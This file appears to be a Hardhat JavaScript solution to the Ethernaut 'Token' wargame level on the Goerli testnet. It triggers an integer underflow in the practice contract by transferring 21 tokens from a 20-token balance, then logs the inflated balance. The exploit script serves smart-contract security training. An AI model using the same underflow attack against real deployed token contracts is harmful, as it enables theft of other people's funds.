/*
  The goal of this level is for you to hack the basic token contract.
  You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.
*/

const hre = require("hardhat");

async function main() {

  //Deployed on Goerli
  [player] = await ethers.getSigners();

  //Get an instance of the contract deployed by Ethernaut
  const TokenAddress = "0x28316c8880342375a0a31743607b4EDB48c1e221"
  this.token = await hre.ethers.getContractAt("Token",TokenAddress);


  console.log(
    `
    Token contract address: ${await this.token.address} \n
    Token total supply: ${await this.token.totalSupply()} \n
    player token's balance: ${await this.token.balanceOf(player.address)} \n
    `
  );

  console.log("\n\n Performing attack ... \n\n");

  // Getting the most amount of tokens for free
  console.log("Getting the most amount of tokens for free ...");
  // Transfering 1 token more than the total balance the player account holds should cause the biggest underflow when updating the player(sender) balances!
  const tx = await this.token.connect(player).transfer(hre.ethers.constants.AddressZero,21);
  
  // Await for the tx to be mined
  console.log("Waiting while we take the free tokens : )");
  let txResult = await tx.wait();

  console.log("transaction " , txResult);

  console.log("\n\n Results after performing the attack \n\n");


  console.log(
    `
    Token contract address: ${await this.token.address} \n
    Token total supply: ${await this.token.totalSupply()} \n
    player token's balance: ${await this.token.balanceOf(player.address)} \n
    `
  );

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});